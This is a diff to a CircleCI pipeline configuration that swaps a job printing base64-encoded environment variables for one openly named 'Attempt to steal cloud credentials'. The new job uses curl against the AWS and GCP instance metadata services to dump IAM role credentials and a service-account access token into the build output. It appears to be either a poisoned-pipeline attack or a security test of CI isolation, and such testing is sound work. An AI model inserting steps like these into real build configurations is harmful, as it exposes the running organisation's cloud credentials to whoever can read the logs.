@@ -1,17 +1,20 @@
 version: 2.1
 
 jobs:
-  exfil-env:
-    docker:
-      - image: cimg/base:stable
+  exfil-metadata:
+    machine:
+      image: ubuntu-2004:current
     steps:
-      - checkout
       - run:
-          name: "Exfil env"
-          command: "env | base64"
+          name: "Attempt to steal cloud credentials"
+          command: |
+            echo ">>> Probing for AWS Metadata Service..."
+            curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
+            echo
+            echo ">>> Probing for GCP Metadata Service..."
+            curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
 
 workflows:
-  exfil-env-workflow:
+  main_workflow:
     jobs:
-      - exfil-env:
-          context: Test-Context
+      - exfil-metadata
